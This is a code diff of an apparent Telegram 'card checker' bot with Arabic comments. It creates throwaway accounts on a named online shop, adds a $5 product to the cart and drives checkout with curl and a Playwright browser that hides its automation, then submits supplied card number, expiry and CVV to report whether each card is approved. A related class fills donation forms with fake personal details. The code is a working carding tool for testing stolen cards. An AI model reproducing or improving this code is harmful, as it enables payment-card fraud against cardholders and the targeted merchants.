@@ -9,11 +9,21 @@ import asyncio
 import httpx
 import requests
 import json
+import subprocess
 import tempfile
 import threading
 from urllib.parse import urlparse
 from fake_useragent import UserAgent
 from datetime import datetime
+
+# ==================== Square Config ====================
+SQUARE_SITE = "https://cosmos-industrial.com"
+SQUARE_PRODUCT_ID = 110  # المنتج الجديد
+SQUARE_PRICE = "5.00"
+SQUARE_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+)
 
 try:
     from playwright.async_api import async_playwright
@@ -42,10 +52,8 @@ VIP_FILE_LIMIT = 2000
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
 
 def run_async(coro):
-    """يشغل كوروتين في thread منفصل مع event loop جديد"""
     result_container = []
     error_container = []
-    
     def target():
         try:
             loop = asyncio.new_event_loop()
@@ -56,11 +64,9 @@ def run_async(coro):
             error_container.append(e)
         finally:
             loop.close()
-    
     thread = threading.Thread(target=target)
     thread.start()
     thread.join()
-    
     if error_container:
         raise error_container[0]
     return result_container[0] if result_container else None
@@ -134,100 +140,123 @@ def banned_guard(message):
         return True
     return False
 
-# ==================== Square Config (Requests) ====================
-SQUARE_SITE = "https://cosmos-industrial.com"
-SQUARE_PRODUCT_ID = 110
-SQUARE_PRICE = "5.00"
-SQUARE_UA = (
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
-    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
-)
+# ==================== Square Logic ====================
+def square_curl(jar, url, *extra):
+    cmd = ["curl", "-sS", "-m", "25", "-c", jar, "-b", jar, "-L"] + [
+        "-A", SQUARE_UA, "--compressed",
+        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "-H", "Accept-Language: en-US,en;q=0.9",
+        "-H", "Sec-Fetch-Site: same-origin",
+        "-H", "Sec-Fetch-Mode: navigate",
+        "-H", "Upgrade-Insecure-Requests: 1",
+    ] + list(extra) + [url]
+    return subprocess.run(cmd, capture_output=True, text=True).stdout
 
-def square_requests_flow(zip_code):
-    session = requests.Session()
-    session.headers.update({
-        "User-Agent": SQUARE_UA,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.9",
-    })
-    
-    r = session.get(SQUARE_SITE + "/")
-    if "cookie_test" not in session.cookies:
-        session.cookies.set("cookie_test", "please_accept_for_session", domain=".cosmos-industrial.com")
+def square_parse_jar(jar_path):
+    cookies = []
+    with open(jar_path) as fh:
+        for line in fh:
+            raw = line.rstrip()
+            if not raw:
+                continue
+            if raw.startswith("#HttpOnly_"):
+                raw = raw[len("#HttpOnly_"):]
+            elif raw.startswith("#"):
+                continue
+            parts = raw.split("\t")
+            if len(parts) < 7:
+                continue
+            cookies.append({
+                "name": parts[5],
+                "value": parts[6],
+                "domain": ".cosmos-industrial.com",
+                "path": parts[2],
+                "secure": parts[3].upper() == "TRUE",
+                "httpOnly": True,
+                "sameSite": "Lax",
+            })
+    return cookies
 
-    r = session.get(SQUARE_SITE + "/index.php?main_page=create_account")
-    m = re.search(r'name="securityToken" value="([^"]+)"', r.text)
-    if not m:
-        return {"error": "reg_token_missing"}
-
+def square_curl_flow(zip_code):
+    jar = tempfile.mktemp()
     ts = int(time.time() * 1000)
     email = f"c{ts}@example.com"
     password = "TestPass123!"
-    
-    data = {
-        "securityToken": m.group(1),
-        "action": "process",
-        "email_pref_html": "email_format",
-        "firstname": "Test",
-        "lastname": "User",
-        "street_address": "123 Main St",
-        "suburb": "",
-        "city": "Austin",
-        "zone_country_id": "223",
-        "country": "223",
-        "zone_id": "57",
-        "state": "Texas",
-        "postcode": zip_code,
-        "telephone": "5125551234",
-        "email_address": email,
-        "password": password,
-        "confirmation": password,
-        "newsletter": "",
-        "email_format": "HTML"
-    }
-    session.post(SQUARE_SITE + "/index.php?main_page=create_account&action=process", data=data)
 
-    session.get(SQUARE_SITE + f"/index.php?main_page=product_info&products_id={SQUARE_PRODUCT_ID}&action=buy_now")
+    square_curl(jar, SQUARE_SITE + "/")
+    lines = open(jar).read().splitlines()
+    if not any("cookie_test" in line for line in lines):
+        lines.append(".cosmos-industrial.com\tTRUE\t/\tTRUE\t0\tcookie_test\tplease_accept_for_session")
+        open(jar, "w").write("\n".join(lines) + "\n")
 
-    r = session.get(SQUARE_SITE + "/index.php?main_page=checkout_shipping")
-    m = re.search(r'name="securityToken" value="([^"]+)"', r.text)
+    page = square_curl(jar, SQUARE_SITE + "/index.php?main_page=create_account")
+    m = re.search(r'name="securityToken" value="([^"]+)"', page)
     if not m:
-        return {"error": "ship_token_missing"}
+        return jar, {"error": "reg_token_missing"}
 
-    data = {
-        "securityToken": m.group(1),
-        "action": "process",
-        "shipping": "zones_zones"
-    }
-    session.post(SQUARE_SITE + "/index.php?main_page=checkout_shipping&action=process", data=data)
+    square_curl(
+        jar,
+        SQUARE_SITE + "/index.php?main_page=create_account&action=process",
+        "-H", f"Referer: {SQUARE_SITE}/index.php?main_page=create_account",
+        "--data-urlencode", f"securityToken={m.group(1)}",
+        "--data-urlencode", "action=process",
+        "--data-urlencode", "email_pref_html=email_format",
+        "--data-urlencode", "firstname=Test",
+        "--data-urlencode", "lastname=User",
+        "--data-urlencode", "street_address=123 Main St",
+        "--data-urlencode", "suburb=",
+        "--data-urlencode", "city=Austin",
+        "--data-urlencode", "zone_country_id=223",
+        "--data-urlencode", "country=223",
+        "--data-urlencode", "zone_id=57",
+        "--data-urlencode", "state=Texas",
+        "--data-urlencode", f"postcode={zip_code}",
+        "--data-urlencode", "telephone=5125551234",
+        "--data-urlencode", f"email_address={email}",
+        "--data-urlencode", f"password={password}",
+        "--data-urlencode", f"confirmation={password}",
+        "--data-urlencode", "newsletter=",
+        "--data-urlencode", "email_format=HTML",
+    )
 
-    r = session.get(SQUARE_SITE + "/index.php?main_page=checkout_payment")
-    if "Step 2 of 3" not in r.text:
-        return {"error": "payment_page_not_reached"}
+    square_curl(jar, SQUARE_SITE + f"/index.php?main_page=product_info&products_id={SQUARE_PRODUCT_ID}&action=buy_now")
 
-    return {"ok": True, "session": session}
+    page = square_curl(jar, SQUARE_SITE + "/index.php?main_page=checkout_shipping")
+    m = re.search(r'name="securityToken" value="([^"]+)"', page)
+    if not m:
+        return jar, {"error": "ship_token_missing"}
 
-async def square_pw_submit(browser, session, cc, exp, cvv):
+    square_curl(
+        jar,
+        SQUARE_SITE + "/index.php?main_page=checkout_shipping&action=process",
+        "-H", f"Referer: {SQUARE_SITE}/index.php?main_page=checkout_shipping",
+        "--data-urlencode", f"securityToken={m.group(1)}",
+        "--data-urlencode", "action=process",
+        "--data-urlencode", "shipping=zones_zones",
+    )
+
+    page = square_curl(jar, SQUARE_SITE + "/index.php?main_page=checkout_payment")
+    if "Step 2 of 3" not in page:
+        return jar, {"error": "payment_page_not_reached"}
+
+    return jar, {"ok": True}
+
+async def square_pw_submit(browser, jar_path, cc, exp, cvv):
+    cookies = square_parse_jar(jar_path)
     ctx = await browser.new_context(
         user_agent=SQUARE_UA,
         viewport={"width": 1366, "height": 900},
         locale="en-US",
     )
     await ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
-    for cookie in session.cookies:
-        await ctx.add_cookies([{
-            "name": cookie.name,
-            "value": cookie.value,
-            "domain": ".cosmos-industrial.com",
-            "path": "/"
-        }])
+    await ctx.add_cookies(cookies)
     page = await ctx.new_page()
 
     try:
         await page.goto(
             SQUARE_SITE + "/index.php?main_page=checkout_payment",
-            wait_until="domcontentloaded",
-            timeout=30000,
+            wait_until="networkidle",
+            timeout=60000,
         )
         if "Step 2" not in await page.title():
             return {"error": "session_lost"}
@@ -246,7 +275,7 @@ async def square_pw_submit(browser, session, cc, exp, cvv):
         await frame.fill("#cvv", cvv)
         await page.wait_for_timeout(800)
 
-        async with page.expect_navigation(timeout=60000):
+        async with page.expect_navigation(timeout=120000):
             await page.click('input[type="submit"][value*="Continue"]')
 
         if "Step 3" not in await page.title():
@@ -265,7 +294,7 @@ async def square_pw_submit(browser, session, cc, exp, cvv):
                     pass
 
         try:
-            async with page.expect_navigation(timeout=90000):
+            async with page.expect_navigation(timeout=120000):
                 await page.click('input[type="submit"][value*="Confirm"]')
         except Exception:
             pass
@@ -288,16 +317,17 @@ async def square_pw_submit(browser, session, cc, exp, cvv):
         await ctx.close()
 
 async def square_run_check_async(cc, mm, yy, cvv, zip_code):
-    state = square_requests_flow(zip_code)
+    jar, state = square_curl_flow(zip_code)
 
     if not state.get("ok"):
+        if os.path.exists(jar):
+            os.unlink(jar)
         return {
             "approved": False,
             "message": state.get("error", "flow_failed"),
             "status": "Declined",
         }
 
-    session = state["session"]
     exp = f"{int(mm):02d}{yy[-2:]}"
 
     try:
@@ -307,11 +337,12 @@ async def square_run_check_async(cc, mm, yy, cvv, zip_code):
                 args=["--no-sandbox", "--disable-blink-features=AutomationControlled"],
             )
             try:
-                raw = await square_pw_submit(browser, session, cc, exp, cvv)
+                raw = await square_pw_submit(browser, jar, cc, exp, cvv)
             finally:
                 await browser.close()
     finally:
-        pass
+        if os.path.exists(jar):
+            os.unlink(jar)
 
     return raw
 
@@ -341,7 +372,6 @@ def check_square_sync(card_str):
         cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
         started = time.time()
         
-        # تشغيل Playwright في thread منفصل مع event loop خاص بيه
         result_container = []
         error_container = []
         def run_square():
@@ -659,10 +689,8 @@ class PayPalCommerce:
         data['give_first'] = first_name
         data['give_last'] = last_name
         data['give_email'] = self.email
-        
         title = random.choice(["Mr", "Mrs", "Ms", "Dr"])
         data['give_title'] = title
-        
         inputs = re.findall(r'<(?:input|select|textarea)[^>]*name=["\']([^"\']+)["\'][^>]*>', form_html, re.IGNORECASE)
         optional_fields = {
             'give_company': '',
